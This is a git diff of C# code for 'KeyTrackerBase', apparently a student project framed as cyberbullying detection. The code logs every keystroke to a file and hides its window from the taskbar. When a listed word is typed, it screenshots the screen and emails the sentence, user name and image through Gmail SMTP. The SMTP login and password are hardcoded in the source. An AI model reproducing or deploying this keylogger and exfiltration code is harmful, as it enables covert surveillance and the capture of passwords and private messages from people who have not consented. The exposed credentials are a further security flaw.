@@ -21,11 +21,17 @@ namespace KeyTrackerBase
         string sentence;
         string badWords;
         string userName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
-        string[] words = File.ReadAllLines(@"C:\\Users\\Dave\\Documents\\GitHub\\GroupProjectUpdated\\KeyTrackerBase\\words.txt");
         int countWord = 0;
         int countChar = 0;
         int countDetect = 0;
         int iScreen = 0;
+
+        //reads .txt files into arrays
+        string[] words;
+        string[] low = File.ReadAllLines(@"C:\\Users\\Jon\\Desktop\\GroupProjectUpdated\\KeyTrackerBase\\low.txt");
+        string[] medium = File.ReadAllLines(@"C:\\Users\\Jon\\Desktop\\GroupProjectUpdated\\KeyTrackerBase\\medium.txt");
+        string[] high = File.ReadAllLines(@"C:\\Users\\Jon\\Desktop\\GroupProjectUpdated\\KeyTrackerBase\\high.txt");
+        string[] settings = File.ReadAllLines(@"C:\\Users\\Jon\\Desktop\\GroupProjectUpdated\\KeyTrackerBase\\settings.txt");
 
         //create icon 
         NotifyIcon systemTrayIcon;
@@ -33,13 +39,13 @@ namespace KeyTrackerBase
 
         public Form1()
         {
-            #region Form Stuff
+            #region Form & System Tray
             //hide form
             this.WindowState = FormWindowState.Minimized;
-            //this.ShowInTaskbar = false;
+            this.ShowInTaskbar = false;
 
             //Load icon
-            applicationIcon = new Icon("C:\\Users\\Dave\\Documents\\GitHub\\GroupProjectUpdated\\KeyTrackerBase\\Test_2\\f_Owl_Icon.ico");
+            applicationIcon = new Icon("C:\\Users\\Jon\\Desktop\\GroupProjectUpdated\\KeyTrackerBase\\f_Owl_Icon.ico");
 
             //show system tray icon and assign the icon for it
             systemTrayIcon = new NotifyIcon();
@@ -72,7 +78,29 @@ namespace KeyTrackerBase
 
             #endregion
 
+            #region Word Checker
+
+            //hierarchy level of words
+            switch (settings[4])
+            {
+                case "low":
+                    words = File.ReadAllLines(@"C:\\Users\\Jon\\Desktop\\GroupProjectUpdated\\KeyTrackerBase\\low.txt");
+                    break;
+                case "medium":
+
+                    break;
+                case "High":
+
+                    break;
+                default:
+
+                    break;
+            }
+
+            #endregion
+
         }
+
         //opens settings form on click in menu
         void settingsItem_Click(object sender, EventArgs e)
         {
@@ -139,27 +167,6 @@ namespace KeyTrackerBase
                 sentence += ((char)e.KeyValue).ToString().ToLower();
                 textBox1.Text = sentence;
 
-                #region Word Checker
-
-                    ////hierarchy level of words
-                    //switch (level)
-                    //{
-                    //    case "low":
-
-                    //        break;
-                    //    case "medium":
-
-                    //        break;
-                    //    case "High":
-
-                    //        break;
-                    //    default:
-
-                    //        break;
-                    //}
-
-                #endregion
-
                 #region Word Detector
 
                 if (sentence != "\r")
@@ -170,15 +177,14 @@ namespace KeyTrackerBase
                             {
                                 if (sentence != "")
                                 {
-                                    using (StreamWriter file = new StreamWriter(@"C:\\Users\\Dave\\Documents\\GitHub\\GroupProjectUpdated\\KeyTrackerBase\\log.txt", true))
+                                    using (StreamWriter file = new StreamWriter(@"C:\\Users\\Jon\\Desktop\\GroupProjectUpdated\\KeyTrackerBase\\log.txt", true))
                                     {
                                         if (e.KeyCode != Keys.OemPeriod)
                                         {
                                             //writes entries to txt file - logger
                                             file.WriteLine(DateTime.Now.ToString() + ":  " + sentence);
-                                            //word detection - NOT WORKING
-                                            for (
-                                                int i = 0; i < words.Length; i++)
+                                            //word detection
+                                            for (int i = 0; i < words.Length; i++)
                                             {
                                                 if (sentence.Contains(words[i]))
                                                 {
@@ -195,9 +201,9 @@ namespace KeyTrackerBase
                                                     Bitmap screencapture = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                                                     Graphics graphics = Graphics.FromImage(screencapture as Image);
                                                     graphics.CopyFromScreen(0, 0, 0, 0, screencapture.Size);
-                                                    screencapture.Save(@"C:\\Users\\Dave\\Desktop\\screenshot" + iScreen + ".jpeg", System.Drawing.Imaging.ImageFormat.Jpeg);
+                                                    screencapture.Save(@"C:\\Users\\Jon\\Desktop\\screenshot" + iScreen + ".jpeg", System.Drawing.Imaging.ImageFormat.Jpeg);
                                                     
-                                                    SendEmail("cyberbullyingauthority@gmail.com", "User: " + userName + badWords, "Sentence: " + sentence, @"C:\\Users\\Jon\\Desktop\\screenshot" + iScreen + ".jpeg");
+                                                    SendEmail(settings[0], "User: " + userName + badWords, "Sentence: " + sentence, @"C:\\Users\\Jon\\Desktop\\screenshot" + iScreen + ".jpeg");
                                                     iScreen++;
 
                                         }
@@ -226,11 +232,6 @@ namespace KeyTrackerBase
             }
 
             #endregion
-
-            
-
-            
-
         }
 
 
@@ -266,12 +267,13 @@ namespace KeyTrackerBase
 
                 //crearting client object with gmail smtp details and port
                 SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
+                client.ServicePoint.MaxIdleTime = 1;
                 //login credentials of screenshot sender
                 client.Credentials = new System.Net.NetworkCredential("screenshotbully@gmail.com", "cyberbullying");
                 //enabling secure connection
                 client.EnableSsl = true;
-                //sending the email message
-                client.Send(message);
+                //sending the email message - using 'SendAsync' as it almost completley removes lag
+                client.SendAsync(message, null);
 
                 //------------------------------end-----------------------------------------------
                 //freeing memory
